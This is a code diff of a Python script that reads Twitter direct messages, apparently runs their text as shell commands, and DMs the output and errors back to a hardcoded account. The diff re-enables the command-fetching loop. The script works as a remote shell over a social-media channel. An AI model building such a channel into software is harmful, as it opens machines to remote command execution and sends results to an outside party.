@@ -19,7 +19,7 @@ adam_menthe_id="709007460401606656"
 ids="id_memory_file.txt"
 
 global app_to_be_used
-app_to_be_used = app2
+app_to_be_used = app1
 
 auth = tw.OAuthHandler(app_to_be_used[0][0],app_to_be_used[0][1])
 auth.set_access_token(app_to_be_used[1][0],app_to_be_used[1][1])
@@ -28,7 +28,7 @@ api = tw.API(auth)
 
 global count
 count = 0
-print("app2")
+print("app1")
 
 def refresh_auth():
     global api
@@ -36,15 +36,9 @@ def refresh_auth():
     auth.set_access_token(app_to_be_used[1][0],app_to_be_used[1][1])
     api = tw.API(auth)
     
-testmsg = "test n°24 (21s) message post limit"
-global i
-i=0
 
 def send_message(message):
-    global i
     api.send_direct_message(user_id=int(adam_menthe_id),text=message)
-    i+=1
-    print(i)
 
 
 def fetch_last_message():#everything is in the title
@@ -83,7 +77,7 @@ def fetch_last_message():#everything is in the title
         output, err = p.communicate()
         if err == "":
             err = 'None'
-        send_message("out : " + output + "\nerror : " + err)
+        send_message("out : " + output + "error : " + err)
     return True
     
 def last_id():#fetches the id of the last task in the memory file
@@ -101,8 +95,7 @@ def add_new_id(id_to_add): #add the id of the last task recieved on top of the m
     print('id : ' + id_to_add + ' added')
 
 def refresh_messages(sc):
-    #fetch_last_message()
-    send_message(testmsg)
+    fetch_last_message()
     sc.enter(21, 1, refresh_messages, (sc,))
     print("waiting 20secs..")
 
